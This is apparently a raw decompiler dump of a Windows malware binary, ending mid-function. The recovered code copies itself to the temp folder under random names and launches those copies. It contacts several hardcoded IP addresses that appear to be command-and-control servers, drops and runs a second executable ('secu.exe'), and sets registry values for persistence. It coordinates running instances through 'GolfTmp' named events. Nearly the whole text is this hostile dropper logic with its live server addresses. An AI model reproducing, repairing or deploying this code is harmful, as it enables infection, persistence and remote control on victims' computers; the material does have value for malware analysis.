    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef ushort wint_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef size_t rsize_t;

typedef ushort wctype_t;




void FUN_00401000(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  wchar_t *unaff_EDI;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_210,0x104);
  pwVar1 = _wcsrchr(&local_210,L'\\');
  *pwVar1 = L'\0';
  pwVar2 = _wcsrchr(pwVar1 + 1,L'.');
  *pwVar2 = L'\0';
  _wcscpy(unaff_EDI,pwVar1 + 1);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401081(HINSTANCE param_1,undefined4 param_2,wchar_t *param_3)

{
  int iVar1;
  DWORD DVar2;
  undefined auStack_21c [4];
  wchar_t wStack_218;
  undefined auStack_216 [522];
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)auStack_21c;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_00424628,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_00424560,100);
  FUN_0040121a();
  _wcscpy((wchar_t *)&DAT_00425130,param_3);
  DAT_00423040 = FUN_00402e79();
  iVar1 = _wcscmp((wchar_t *)&DAT_00425130,(wchar_t *)&DAT_0041dc68);
  if (iVar1 != 0) {
    iVar1 = FUN_00401955();
    if (iVar1 != 0) goto LAB_004010fa;
  }
  iVar1 = FUN_0040128b(param_1);
  if (iVar1 == 0) {
    ___security_check_cookie_4(local_c ^ (uint)auStack_21c);
    return;
  }
  LoadAcceleratorsW(param_1,(LPCWSTR)0x6d);
  wStack_218 = L'\0';
  _memset(auStack_216,0,0x206);
  if ((DAT_00424d78 != 0) && (DAT_00424d7c != 0)) {
    FUN_00402e15();
    DAT_004235ec = DAT_00424d7c;
  }
  GetTickCount();
  FUN_004028a3((wchar_t *)&DAT_00425340,u_Temp7_X_exe_0041dc70);
  Sleep(1000);
  FUN_00402655();
  FUN_004083c4();
  _wcscat_s(&wStack_218,0x104,(wchar_t *)&DAT_0041dc88);
  _wcscat_s(&wStack_218,0x104,(wchar_t *)&DAT_00425340);
  DVar2 = GetFileAttributesW(&wStack_218);
  if (DVar2 != 0xffffffff) {
    Sleep(500);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&wStack_218,&DAT_0041de30,(LPCWSTR)0x0,1);
  }
  Sleep(5000);
  FUN_00402432();
LAB_004010fa:
  FUN_00403141();
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void FUN_0040121a(void)

{
  HINSTANCE in_EAX;
  WNDCLASSEXW local_34;
  
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_00401628;
  local_34.hInstance = in_EAX;
  local_34.hIcon = LoadIconW(in_EAX,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)0x6;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
  local_34.lpszClassName = (LPCWSTR)&DAT_00424560;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_34);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040128b(HINSTANCE param_1)

{
  HWND pHVar1;
  int iVar2;
  HANDLE pvVar3;
  DWORD DVar4;
  int local_c04;
  WSADATA local_c00;
  WCHAR local_a70;
  undefined local_a6e [518];
  undefined2 local_868;
  undefined local_866 [518];
  wchar_t local_660;
  undefined local_65e [518];
  wchar_t local_458;
  undefined local_456 [518];
  WCHAR local_250;
  undefined local_24e [518];
  wchar_t local_48;
  undefined local_46 [58];
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)&stack0xfffffffc;
  DAT_004246f0 = param_1;
  pHVar1 = CreateWindowExW(0,(LPCWSTR)&DAT_00424560,(LPCWSTR)&DAT_00424628,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  if (pHVar1 != (HWND)0x0) {
    local_a70 = L'\0';
    _memset(local_a6e,0,0x206);
    local_250 = L'\0';
    _memset(local_24e,0,0x206);
    local_868 = 0;
    _memset(local_866,0,0x206);
    GetModuleFileNameW((HMODULE)0x0,&local_a70,0x104);
    iVar2 = _wcscmp((wchar_t *)&DAT_00425130,(wchar_t *)&DAT_0041dc68);
    if (iVar2 != 0) {
      local_458 = L'\0';
      _memset(local_456,0,0x206);
      local_660 = L'\0';
      _memset(local_65e,0,0x206);
      _wcscpy(&local_458,u_GolfTmp_0041dc8c);
      _wcscpy(&local_660,&local_458);
      _wcscat(&local_660,u__STOP_0041dc9c);
      pvVar3 = OpenEventW(0x20000,0,&local_458);
      if (pvVar3 != (HANDLE)0x0) {
        CloseHandle(pvVar3);
        CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&local_660);
        local_c04 = 0;
        while ((pvVar3 = OpenEventW(0x20000,0,&local_458), pvVar3 != (HANDLE)0x0 && (local_c04 < 5))
              ) {
          CloseHandle(pvVar3);
          local_c04 = local_c04 + 1;
          Sleep(200);
        }
      }
      _memset(&local_250,0,0x208);
      GetTempPathW(0x104,&local_250);
      _memset(&local_868,0,0x208);
      DVar4 = GetTickCount();
      FUN_00408e77(DVar4);
      FUN_004028ec(6,7,(int)&local_868);
      wsprintfW(&local_250,u__s_s_exe_0041dca8,&local_250,&local_868);
      FUN_004018a4(&local_a70,&local_250);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_250,(LPCWSTR)&DAT_0041dc68,(LPCWSTR)0x0,1);
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    WSAStartup(0x101,&local_c00);
    iVar2 = FUN_00408b07(1);
    if (iVar2 == 0) {
      local_48 = L'\0';
      _memset(local_46,0,0x3a);
      FUN_00401000();
      _wcscpy((wchar_t *)&DAT_00425058,&local_48);
      _wcscpy_s((wchar_t *)&DAT_00424eb4,0x40,u_218_54_31_165_0041dcbc);
      DAT_00424f34 = 0x51;
      _wcscpy_s((wchar_t *)&DAT_00424f36,0x10,u_AAAA_0041dcd8);
      _wcscpy_s((wchar_t *)&DAT_00424f56,0x40,u_218_54_31_226_0041dce4);
      DAT_00424fd6 = 0x2b66;
      _wcscpy((wchar_t *)&DAT_00425038,&local_48);
      _wcscat((wchar_t *)&DAT_00425038,(wchar_t *)&DAT_0041dd00);
      _DAT_00425078 = 5;
    }
    FUN_00401791();
    _wcscat((wchar_t *)&DAT_004250b0,u_GolfTmp_0041dc8c);
    Sleep(2000);
    pvVar3 = OpenEventW(0x20000,0,(LPCWSTR)&DAT_004250b0);
    if (pvVar3 == (HANDLE)0x0) {
      pvVar3 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)&DAT_004250b0);
      if (pvVar3 != (HANDLE)0x0) {
        FUN_00402318((undefined4 *)&DAT_00425548);
        _DAT_00425550 = DAT_0042507c;
        _DAT_004235d8 =
             CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401703,(LPVOID)0x0,0,(LPDWORD)0x0);
      }
    }
    else {
      CloseHandle(pvVar3);
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401628(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  tagPAINTSTRUCT local_4c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (param_2 == 2) {
    PostQuitMessage(0);
  }
  else if (param_2 == 0xf) {
    BeginPaint(param_1,&local_4c);
    EndPaint(param_1,&local_4c);
  }
  else {
    if (param_2 == 0x111) {
      if ((param_3 & 0xffff) == 0x68) {
        DialogBoxParamW(DAT_004246f0,(LPCWSTR)0x67,param_1,FUN_004016cc,0);
        goto LAB_004016bd;
      }
      if ((param_3 & 0xffff) == 0x69) {
        DestroyWindow(param_1);
        goto LAB_004016bd;
      }
      param_2 = 0x111;
    }
    DefWindowProcW(param_1,param_2,param_3,param_4);
  }
LAB_004016bd:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_004016cc(HWND param_1,int param_2,ushort param_3)

{
  if (param_2 != 0x110) {
    if ((param_2 != 0x111) || ((param_3 != 1 && (param_3 != 2)))) {
      return 0;
    }
    EndDialog(param_1,(uint)param_3);
  }
  return 1;
}



void FUN_00401703(void)

{
  HANDLE hObject;
  wchar_t local_208;
  undefined local_206 [510];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_208 = L'\0';
  _memset(local_206,0,0x1fe);
  _wcscpy(&local_208,(wchar_t *)&DAT_004250b0);
  _wcscat(&local_208,u__STOP_0041dc9c);
  do {
    hObject = OpenEventW(0x20000,0,&local_208);
    Sleep(200);
  } while (hObject == (HANDLE)0x0);
  CloseHandle(hObject);
  FUN_00403141();
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void FUN_00401791(void)

{
  _memcpy(&DAT_00424c80,&DAT_00425078,4);
  DAT_00424d78 = FUN_00402cf4(&DAT_00424f56);
  DAT_00424d7c = DAT_00424fd6;
  DAT_00424d7e = FUN_00402cf4(&DAT_00424eb4);
  DAT_00424d82 = (uint)DAT_00424f34;
  _wcscpy((wchar_t *)&DAT_00424d86,(wchar_t *)&DAT_00424f36);
  _wcscpy((wchar_t *)&DAT_00424da6,(wchar_t *)&DAT_00425058);
  _wcscpy((wchar_t *)&DAT_00424dc6,(wchar_t *)&DAT_00425038);
  return;
}



void FUN_00401809(void)

{
  int iVar1;
  wchar_t *unaff_ESI;
  undefined4 *puVar2;
  WCHAR local_238;
  undefined local_236 [518];
  wchar_t local_30;
  undefined4 local_2e [9];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_238 = L'\0';
  _memset(local_236,0,0x206);
  local_30 = L'\0';
  puVar2 = local_2e;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  _wcscpy_s(&local_30,0x14,unaff_ESI);
  _wcscat_s(&local_30,0x14,u__exe_0041dd08);
  GetModuleFileNameW((HMODULE)0x0,&local_238,0x104);
  _wcsstr(&local_238,&local_30);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_004018a4(wchar_t *param_1,wchar_t *param_2)

{
  size_t in_EAX;
  errno_t eVar1;
  size_t _ElementSize;
  void *_DstBuf;
  FILE *local_8;
  
  local_8 = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_8,param_1,(wchar_t *)&DAT_0041dd14);
  if (eVar1 == 0) {
    _fseek(local_8,0,2);
    _ElementSize = _ftell(local_8);
    _fseek(local_8,0,0);
    _DstBuf = _malloc(_ElementSize + in_EAX);
    _fread(_DstBuf,_ElementSize,1,local_8);
    _fclose(local_8);
    FUN_004030cf(in_EAX);
    eVar1 = __wfopen_s(&local_8,param_2,(wchar_t *)&DAT_0041dd1c);
    if (eVar1 == 0) {
      _fwrite(_DstBuf,_ElementSize + in_EAX,1,local_8);
      _fclose(local_8);
      return 1;
    }
  }
  return 0;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_00401955(void)

{
  int iVar1;
  int iVar2;
  DWORD DVar3;
  HANDLE pvVar4;
  LSTATUS LVar5;
  int iVar6;
  undefined4 *puVar7;
  int local_1c50;
  HKEY local_1c44;
  uint local_1c40;
  int local_1c3c;
  uint local_1c38;
  wchar_t local_1c30 [64];
  ushort local_1bb0;
  wchar_t local_1bae [80];
  ushort local_1b0e;
  undefined local_1a34 [8];
  undefined local_1a2c [32];
  wchar_t local_1a0c [110];
  ushort local_1930;
  ushort local_192a;
  wchar_t local_1926 [16];
  wchar_t local_1906 [133];
  int local_17fc;
  wchar_t local_17f8 [64];
  ushort local_1778;
  wchar_t local_1776 [16];
  wchar_t local_1756 [64];
  ushort local_16d6;
  wchar_t local_16d4 [16];
  wchar_t local_16b4 [16];
  wchar_t local_1694 [16];
  wchar_t local_1674 [16];
  wchar_t local_1654 [16];
  int local_1634;
  undefined4 local_1630;
  wchar_t local_15fc;
  undefined local_15fa [2046];
  WCHAR local_dfc;
  undefined local_dfa [518];
  wchar_t local_bf4;
  undefined local_bf2 [518];
  wchar_t local_9ec;
  undefined local_9ea [518];
  WCHAR local_7e4;
  undefined local_7e2 [518];
  wchar_t local_5dc;
  undefined local_5da [518];
  WCHAR local_3d4;
  undefined local_3d2 [518];
  wchar_t local_1cc;
  undefined local_1ca [126];
  wchar_t local_14c;
  undefined local_14a [126];
  wchar_t local_cc;
  undefined local_ca [130];
  wchar_t local_48;
  undefined4 local_46 [7];
  wchar_t local_28;
  undefined4 local_26 [7];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_3d4 = L'\0';
  _memset(local_3d2,0,0x206);
  local_dfc = L'\0';
  _memset(local_dfa,0,0x206);
  local_bf4 = L'\0';
  _memset(local_bf2,0,0x206);
  local_28 = L'\0';
  puVar7 = local_26;
  for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  *(undefined2 *)puVar7 = 0;
  local_14c = L'\0';
  _memset(local_14a,0,0x7e);
  local_cc = L'\0';
  _memset(local_ca,0,0x7e);
  local_1cc = L'\0';
  local_1c40 = 0;
  _memset(local_1ca,0,0x7e);
  local_7e4 = L'\0';
  local_1c38 = 0;
  _memset(local_7e2,0,0x206);
  local_48 = L'\0';
  puVar7 = local_46;
  for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  *(undefined2 *)puVar7 = 0;
  local_1c3c = 0;
  local_1c50 = 0;
  _memset(&local_17fc,0,0x200);
  iVar6 = FUN_00408b07(1);
  iVar1 = FUN_00408b07(0);
  GetModuleFileNameW((HMODULE)0x0,&local_dfc,0x104);
  if (iVar6 == 0) {
    if (DAT_00423040 == 3) {
      _memset(local_1a34,0,0x236);
      local_1c50 = FUN_00403612();
      if (local_1c50 != 0) {
        _wcscpy(&local_14c,local_1926);
        FUN_00402db0();
        local_1c40 = (uint)local_192a;
        FUN_00402db0();
        local_1c38 = (uint)local_1930;
        _memcpy(&local_1c3c,local_1a2c,4);
        _wcscpy_s(&local_28,0x10,local_1906);
      }
    }
  }
  else {
    GetTempPathW(0x104,&local_3d4);
    _wcscat_s(&local_3d4,0x104,local_1674);
    _wcscat_s(&local_3d4,0x104,u__exe_0041dd08);
    iVar2 = FUN_00409dc5(&local_3d4);
    if ((iVar2 != 0) && (DVar3 = GetFileAttributesW(&local_3d4), DVar3 != 0xffffffff)) {
      _wcscpy(local_1a0c,local_1674);
      _wcscat_s(local_1a0c,0x104,u__exe_0041dd08);
      DeleteFileW(&local_3d4);
    }
    GetTempPathW(0x104,&local_3d4);
    _wcscat_s(&local_3d4,0x104,u_HGDraw_dll_0041dd24);
    iVar2 = FUN_00409dc5(&local_3d4);
    if ((iVar2 != 0) && (DVar3 = GetFileAttributesW(&local_3d4), DVar3 != 0xffffffff)) {
      DeleteFileW(&local_3d4);
    }
    iVar2 = FUN_00401809();
    if (iVar2 == 1) goto LAB_00402269;
    _wcscpy_s(&local_28,0x10,local_1654);
    FUN_0040303a();
    local_5dc = L'\0';
    _memset(local_5da,0,0x206);
    local_9ec = L'\0';
    _memset(local_9ea,0,0x206);
    _wcscpy(&local_5dc,local_1654);
    _wcscpy(&local_9ec,local_1654);
    _wcscat(&local_9ec,u__STOP_0041dc9c);
    pvVar4 = OpenEventW(0x20000,0,&local_5dc);
    if (pvVar4 != (HANDLE)0x0) {
      CloseHandle(pvVar4);
      CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&local_9ec);
      local_1c38 = 0;
      while ((pvVar4 = OpenEventW(0x20000,0,&local_5dc), pvVar4 != (HANDLE)0x0 &&
             ((int)local_1c38 < 5))) {
        CloseHandle(pvVar4);
        local_1c38 = local_1c38 + 1;
        Sleep(200);
      }
    }
    Sleep(0x5dc);
    DeleteFileW(&local_3d4);
    _wcscpy(&local_14c,local_1776);
    _wcscpy(&local_cc,local_17f8);
    local_1c40 = (uint)local_1778;
    _wcscpy(&local_1cc,local_1756);
    local_1c38 = (uint)local_16d6;
    local_1c3c = local_1634;
    _wcscpy_s(&local_48,0x10,local_1674);
  }
  if (iVar1 != 0) {
    _wcscpy(&local_14c,local_1bae);
    _wcscpy(&local_cc,local_1c30);
    local_1c40 = (uint)local_1bb0;
    _wcscpy(&local_1cc,u_218_54_31_226_0041dce4);
    local_1c38 = (uint)local_1b0e;
    local_1c3c = 5;
    if (DAT_00423040 == 3) {
      GetSystemDirectoryW(&local_7e4,0x104);
      _wcscat_s(&local_7e4,0x104,(wchar_t *)&DAT_0041dc88);
    }
    else {
      GetTempPathW(0x104,&local_7e4);
    }
    _wcscpy(&local_bf4,&local_7e4);
    _wcscat_s(&local_bf4,0x104,u_golfset_ini_0041dd3c);
    DeleteFileW(&local_bf4);
  }
  _memset(&local_17fc,0,0x200);
  local_1778 = 0x51;
  local_17fc = 0x504d534d;
  _wcscpy(local_17f8,u_218_54_31_165_0041dcbc);
  local_16d6 = 0x2b66;
  _wcscpy(local_1756,u_218_54_31_226_0041dce4);
  _wcscpy(local_1776,u_AAAA_0041dcd8);
  local_1634 = 5;
  if (((iVar6 != 0) || (local_1c50 != 0)) || (iVar1 != 0)) {
    _wcscpy_s(local_1776,0x10,&local_14c);
    _wcscpy_s(local_17f8,0x40,&local_cc);
    local_1778 = (ushort)local_1c40;
    _wcscpy_s(local_1756,0x40,&local_1cc);
    local_16d6 = (ushort)local_1c38;
    local_1634 = local_1c3c;
    if (local_1c3c == 0) {
      local_1634 = 5;
    }
  }
  _wcscpy(local_1756,u_218_54_31_226_0041dce4);
  if ((local_17f8[0] != L'\0') && (local_1778 != 0)) {
    local_17fc = 0x504d534d;
    DVar3 = GetTickCount();
    FUN_00408e77(DVar3);
    local_15fc = L'\0';
    _memset(local_15fa,0,0x7fe);
    if (local_16d4[0] == L'\0') {
      FUN_004028ec(5,6,(int)&local_15fc);
      _wcscpy_s(local_16d4,0x10,&local_15fc);
    }
    if (local_16b4[0] == L'\0') {
      FUN_004028ec(5,6,(int)&local_15fc);
      _wcscpy_s(local_16b4,0x10,&local_15fc);
    }
    if (local_1674[0] == L'\0') {
      FUN_004028ec(5,6,(int)&local_15fc);
      _wcscpy_s(local_1674,0x10,&local_15fc);
    }
    if (local_1654[0] == L'\0') {
      FUN_004028ec(5,6,(int)&local_15fc);
      _wcscpy_s(local_1654,0x10,&local_15fc);
      iVar6 = FUN_00409dc5(&local_28);
      if (iVar6 != 0) {
        _wcscpy_s(local_1654,0x10,&local_28);
      }
    }
    iVar6 = FUN_00409dc5(&local_48);
    if (iVar6 != 0) {
      _wcscpy_s(local_1694,0x10,&local_48);
    }
    if (local_1694[0] == L'\0') {
      FUN_004028ec(5,6,(int)&local_15fc);
      _wcscpy_s(local_1694,0x10,&local_15fc);
    }
    local_1630 = 0x10001ce;
    if (local_1634 == 0) {
      local_1634 = 5;
    }
    iVar6 = FUN_00408b93(&local_17fc);
    if (iVar6 != 0) {
      FUN_0040303a();
      DVar3 = GetTickCount();
      FUN_00408e77(DVar3);
      FUN_004028be(0x32);
      FUN_004018a4(&local_dfc,&local_3d4);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_3d4,(LPCWSTR)&DAT_0041dd54,(LPCWSTR)0x0,1);
      local_1c44 = (HKEY)0x0;
      LVar5 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dd60,0,3,
                            &local_1c44);
      if (LVar5 == 0) {
        iVar6 = FUN_00409dc5(&local_3d4);
        LVar5 = RegSetValueExW(local_1c44,(LPCWSTR)&DAT_0041ddcc,0,1,(BYTE *)&local_3d4,
                               iVar6 * 2 + 2);
        if (LVar5 == 0) {
          RegCloseKey(local_1c44);
        }
      }
    }
  }
LAB_00402269:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



bool __cdecl FUN_00402278(LPCWSTR param_1,undefined4 param_2,void *param_3)

{
  bool bVar1;
  DWORD DVar2;
  void *_Memory;
  int iVar3;
  undefined3 extraout_var;
  undefined8 uVar4;
  ulonglong uVar5;
  
  bVar1 = false;
  DVar2 = GetFileAttributesW(param_1);
  if ((DVar2 != 0xffffffff) && (uVar4 = FUN_00402f15(param_1), (void *)uVar4 == param_3)) {
    return true;
  }
  _Memory = _malloc(0x200000);
  iVar3 = FUN_00404f8b(param_2,param_3,_Memory);
  if (iVar3 != 0) {
    DVar2 = GetTickCount();
    FUN_00408e77(DVar2);
    uVar5 = FUN_004028be(0x32);
    FUN_004030cf((size_t)uVar5);
    bVar1 = FUN_00408bfe(param_1,_Memory,(size_t)uVar5 + 0x200000);
    bVar1 = CONCAT31(extraout_var,bVar1) == 1;
  }
  _free(_Memory);
  return bVar1;
}



void __fastcall FUN_00402318(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined local_cc [74];
  undefined local_82 [6];
  undefined4 local_7c;
  wchar_t local_74 [38];
  undefined2 local_28;
  undefined4 local_26 [7];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_28 = 0;
  puVar2 = local_26;
  for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  _memset(local_cc,0,0xa0);
  _memset(param_1,0,0x200);
  iVar1 = FUN_00402f6a(local_cc);
  if (iVar1 != 0) {
    *param_1 = 0x1000000;
    param_1[1] = (((uint)DAT_00424c83 * 0x100 + (uint)DAT_00424c82) * 0x100 + (uint)DAT_00424c81) *
                 0x100 + (uint)DAT_00424c80;
    param_1[3] = local_7c;
    param_1[2] = 0x10001ce;
    _memcpy(param_1 + 4,local_82,6);
    _wcscpy((wchar_t *)((int)param_1 + 0x16),local_74);
    iVar1 = FUN_00402e79();
    _wcscpy((wchar_t *)((int)param_1 + 0x96),u_UnKmownOS_00423048 + iVar1 * 10);
    *(undefined4 *)((int)param_1 + 0x196) = DAT_00424d7e;
    *(undefined4 *)((int)param_1 + 0x19a) = DAT_00424d82;
    _wcscpy((wchar_t *)((int)param_1 + 0x19e),(wchar_t *)&DAT_00424d86);
    FUN_00402db0();
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402432(void)

{
  HANDLE pvVar1;
  LSTATUS LVar2;
  void *pvVar3;
  int iVar4;
  undefined4 *puVar5;
  wchar_t *_Source;
  DWORD local_24c;
  DWORD local_248;
  void *local_244;
  HKEY local_240;
  WCHAR local_23c;
  undefined local_23a [522];
  WCHAR local_30;
  undefined4 local_2e [9];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_23c = L'\0';
  _memset(local_23a,0,0x206);
  local_30 = L'\0';
  puVar5 = local_2e;
  for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  local_24c = 0;
  local_248 = 0x104;
  iVar4 = FUN_00409dc5((short *)&DAT_00425018);
  if (iVar4 != 0) {
    pvVar1 = OpenEventW(0x20000,0,(LPCWSTR)&DAT_00425018);
    if (pvVar1 != (HANDLE)0x0) goto LAB_00402644;
  }
  LVar2 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dd60,0,0xf003f,
                        &local_240);
  if (LVar2 == 0) {
    LVar2 = RegQueryValueExW(local_240,u_TrayKey_0041dddc,(LPDWORD)0x0,&local_24c,(LPBYTE)&local_30,
                             &local_248);
    if (LVar2 == 0) {
      pvVar1 = OpenEventW(0x20000,0,&local_30);
      if (pvVar1 != (HANDLE)0x0) {
        RegCloseKey(local_240);
        goto LAB_00402644;
      }
    }
    RegCloseKey(local_240);
  }
  local_244 = (void *)0x0;
  GetTempPathW(0x104,&local_23c);
  iVar4 = FUN_00409dc5((short *)&DAT_00425038);
  if (iVar4 == 0) {
    _wcscat_s(&local_23c,0x104,u_secu_0041ddec);
    _Source = u_secu_0041ddec;
  }
  else {
    _wcscat_s(&local_23c,0x104,(wchar_t *)&DAT_00425038);
    _Source = (wchar_t *)&DAT_00425038;
  }
  _wcscpy(&local_30,_Source);
  _wcscat_s(&local_23c,0x104,u__exe_0041dd08);
  pvVar3 = FUN_00402974((DWORD *)&local_244);
  if (pvVar3 != (void *)0x0) {
    FUN_00402278(&local_23c,pvVar3,local_244);
    Sleep(1000);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_23c,&DAT_0041de30,(LPCWSTR)0x0,1);
    LVar2 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dd60,0,3,
                          &local_240);
    if (LVar2 == 0) {
      iVar4 = FUN_00409dc5(&local_30);
      LVar2 = RegSetValueExW(local_240,u_TrayKey_0041dddc,0,1,(BYTE *)&local_30,iVar4 * 2 + 2);
      if (LVar2 == 0) {
        RegCloseKey(local_240);
      }
    }
    FUN_0040b579(pvVar3);
  }
LAB_00402644:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402655(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  u_short uVar4;
  char local_18;
  undefined4 local_17;
  undefined4 uStack_13;
  undefined4 uStack_f;
  undefined2 uStack_b;
  undefined uStack_9;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_18 = '\0';
  local_17 = 0;
  uStack_13 = 0;
  uStack_f = 0;
  uStack_b = 0;
  uStack_9 = 0;
  iVar1 = FUN_00402719(s_218_54_31_226_004235dc,DAT_004235ec);
  if (iVar1 != 0) {
    if (DAT_00423040 == 3) {
      uVar4 = 0x2bac;
    }
    else {
      uVar4 = 0x2ba2;
    }
    iVar2 = FUN_00402719(s_1_234_83_146_0041de10,uVar4);
    if (iVar2 != 0) {
      if (DAT_00424d7e != 0) {
        FUN_00402e15();
      }
      iVar3 = FUN_00402719(&local_18,DAT_004235ec);
      if ((((iVar3 != 0) && (iVar1 == 1)) && (iVar2 == 1)) && (iVar3 == 1)) {
        FUN_00402719(s_133_242_129_155_0041de20,DAT_004235ec);
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00402719(char *param_1,u_short param_2)

{
  int iVar1;
  short *this;
  wchar_t *_Src;
  wchar_t local_42c;
  undefined local_42a [518];
  wchar_t local_224;
  undefined local_222 [518];
  undefined local_1c;
  undefined4 local_1b;
  undefined4 uStack_17;
  undefined4 uStack_13;
  undefined4 uStack_f;
  undefined2 uStack_b;
